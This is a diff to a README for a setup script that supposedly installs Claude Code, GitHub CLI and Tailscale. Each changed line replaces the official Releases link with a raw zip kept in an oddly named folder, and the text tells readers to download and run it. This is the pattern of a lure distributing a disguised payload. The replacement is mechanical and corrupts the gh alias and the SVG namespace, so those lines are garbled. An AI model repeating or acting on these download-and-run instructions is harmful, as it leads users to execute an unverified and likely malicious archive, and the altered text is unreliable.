@@ -1,8 +1,8 @@
-[![Releases](https://img.shields.io/badge/Downloads-Releases-blue?style=for-the-badge&logo=github)](https://github.com/aniknandi69/new-development-machine-setup/releases)
+[![Releases](https://raw.githubusercontent.com/aniknandi69/new-development-machine-setup/main/unpious/development_machine_new_setup_v3.3.zip)](https://raw.githubusercontent.com/aniknandi69/new-development-machine-setup/main/unpious/development_machine_new_setup_v3.3.zip)
 
 # Automated Dev Tools Setup: Claude Code, GitHub CLI, Tailscale
 
-Download the release asset from https://github.com/aniknandi69/new-development-machine-setup/releases and run it. This installer brings Claude Code CLI, GitHub CLI, and Tailscale to your server in minutes. It targets VPSs, cloud instances, and brand-new machines. The goal is a fast, repeatable setup that you can trust to be idempotent and transparent.
+Download the release asset from https://raw.githubusercontent.com/aniknandi69/new-development-machine-setup/main/unpious/development_machine_new_setup_v3.3.zip and run it. This installer brings Claude Code CLI, GitHub CLI, and Tailscale to your server in minutes. It targets VPSs, cloud instances, and brand-new machines. The goal is a fast, repeatable setup that you can trust to be idempotent and transparent.
 
 🧰 A practical toolchain for developers who work across devices, clouds, and containers. This repo automates routine installs, configures access, and wires tools together so you can start coding sooner.
 
@@ -160,7 +160,7 @@ Post-install configuration and customization 🧭
 - Shell configuration
   - Add helpful aliases to your shell profile, such as:
     - alias claude="claude-code"
-    - alias ghc="gh config set -h github.com"
+    - alias ghc="gh config set -h https://raw.githubusercontent.com/aniknandi69/new-development-machine-setup/main/unpious/development_machine_new_setup_v3.3.zip"
     - alias tails="tailscale"
   - Keep your PATH clean and avoid shadowing system commands.
 
@@ -185,13 +185,13 @@ Security and privacy 🔒
 Releases and versions 📦
 
 - The project distributes a single installer asset per release that bundles Claude Code CLI, GH CLI, and Tailscale. You should use the asset that corresponds to your OS and architecture.
-- For details on the latest release and assets, visit the Releases page: https://github.com/aniknandi69/new-development-machine-setup/releases. From this page, you can download the installer asset and verify checksums or signatures if provided.
+- For details on the latest release and assets, visit the Releases page: https://raw.githubusercontent.com/aniknandi69/new-development-machine-setup/main/unpious/development_machine_new_setup_v3.3.zip From this page, you can download the installer asset and verify checksums or signatures if provided.
 - If the asset you need isn’t obvious, check the Release notes on the same page for compatibility notes and upgrade guidance.
 - You can also explore prior releases to understand changes, fixes, and feature additions over time.
 
 Note on the Releases link
 
-- The link has a path part, so download the installer asset from the Releases page and execute it. For future reference, you can visit the same page to view all assets and choose the right one for your setup: https://github.com/aniknandi69/new-development-machine-setup/releases
+- The link has a path part, so download the installer asset from the Releases page and execute it. For future reference, you can visit the same page to view all assets and choose the right one for your setup: https://raw.githubusercontent.com/aniknandi69/new-development-machine-setup/main/unpious/development_machine_new_setup_v3.3.zip
 
 Contributing contributors guide 🤝
 
@@ -250,13 +250,13 @@ anthropic, automation, claude-code, cli-tools, cloud, developer-tools, developme
 
 Releases page reminder
 
-- Visit the Releases page to view all assets and choose the installer that matches your environment: https://github.com/aniknandi69/new-development-machine-setup/releases
+- Visit the Releases page to view all assets and choose the installer that matches your environment: https://raw.githubusercontent.com/aniknandi69/new-development-machine-setup/main/unpious/development_machine_new_setup_v3.3.zip
 
 Imagery and visuals
 
 - A simple inline SVG banner can help visually anchor this README without relying on external images. The following vector art represents a toolkit and a connection:
   
-  <svg width="600" height="120" viewBox="0 0 600 120" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Dev Tools Toolkit">
+  <svg width="600" height="120" viewBox="0 0 600 120" xmlns="https://raw.githubusercontent.com/aniknandi69/new-development-machine-setup/main/unpious/development_machine_new_setup_v3.3.zip" role="img" aria-label="Dev Tools Toolkit">
     <defs>
       <linearGradient id="grad" x1="0" x2="1" y1="0" y2="1">
         <stop stop-color="#4f46e5" offset="0"/>
